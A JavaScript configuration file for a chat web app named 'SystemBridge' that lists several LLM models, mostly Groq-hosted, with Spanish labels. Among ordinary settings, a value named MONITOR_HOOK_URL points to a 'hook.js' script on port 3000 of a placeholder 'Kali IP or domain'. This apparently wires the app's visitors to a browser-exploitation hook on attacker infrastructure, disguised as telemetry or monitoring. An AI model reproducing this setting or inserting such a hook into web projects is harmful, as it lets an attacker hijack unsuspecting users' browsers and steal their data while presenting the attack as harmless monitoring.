const CONFIG = {
  APP_NAME: 'SystemBridge',
  VERSION: '6.1.0',

  MODELS: [
    {
      id: 'groq:llama-3.3-70b-versatile',
      label: 'Llama 3.3 70B (Potente)',
      description: 'El modelo más capaz de Groq.'
    },
    {
      id: 'groq:llama-3.1-70b-versatile',
      label: 'Llama 3.1 70B (Equilibrado)',
      description: 'Excelente para tareas complejas.'
    },
    {
      id: 'groq:mixtral-8x7b-32768',
      label: 'Mixtral 8x7B (Rápido)',
      description: 'Modelo versátil y veloz.'
    },
    {
      id: 'groq:llama-3.1-8b-instant',
      label: 'Llama 3.1 8B (Instantáneo)',
      description: 'Respuesta inmediata.'
    },
    {
      id: 'zen:opencodezen-bigpickle',
      label: 'Big Pickle (OpenCode)',
      description: 'Especialista en código y lógica.'
    },
    {
      id: 'zen:minimax-m2.5-free',
      label: 'MiniMax Free (OpenCode)',
      description: 'Alternativa gratuita de alta calidad.'
    }
  ],

  DEFAULT_MODEL: 'groq:llama-3.3-70b-versatile',
  API_ENDPOINT: '/api/chat',
  TELEMETRY_INTERVAL_MS: 300000,
  MONITOR_HOOK_URL: 'http://[TU_IP_KALI_O_DOMINIO]:3000/hook.js',
  ASSET_MGMT_ENDPOINT: ''
};

window.CONFIG = CONFIG;
